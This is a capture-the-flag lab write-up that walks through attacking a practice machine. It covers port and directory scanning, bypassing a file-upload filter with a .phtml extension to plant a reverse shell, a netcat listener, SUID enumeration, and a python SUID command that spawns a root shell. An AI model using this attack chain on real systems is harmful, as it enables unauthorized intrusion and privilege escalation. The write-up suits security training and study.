
# Scanning and Enumeration

Doing an nmap scan:

```bash
nmap -p- -A -T4 10.10.25.127
```

Output:

```bash
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)

|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)

|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

| http-cookie-flags: 

|   /: 

|     PHPSESSID: 

|_      httponly flag not set

|_http-server-header: Apache/2.4.29 (Ubuntu)

|_http-title: HackIT - Home

Linux 3.1 (95%)
```

Let's run gobuster to see if there's any hidden dir:

```bash
gobuster dir -u http://10.10.25.127 -w /usr/share/wordlists/dirb/common.txt
```

Output:

```bash
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```

# Exploitation

We have a **/panel** dir that we can upload files and a
**/uploads** that we can view the upload files

We get no permition to upload a file called: rev.php

I changed the file extension from .php to .phtml and we can
bypass the filter

Start a reverse shell:

```bash
nc -nvlp 4444
```

Navigate to /uploads and we get a shell

To get the first flag:

```bash
find / -name "user.txt" 2>/dev/null
/var/www/user.txt
```

SSH in the machine

```bash
ssh dark@10.10.127.152
```

# Post Exploitation

We can upload linpeas to the machine and enumarate but in this case
the developer is kind to us and tells us that we need to see the SUID
permissions in the machine. To do that:

```bash
find / -user root -perm /4000 2>/dev/null
```

Output:

```bash
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
...
```

# Privilege Escalation

**/usr/bin/python** is pretty weird to have the SUID bit set

If we look for python in
[GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid)

First spawn a tty

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

And then

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
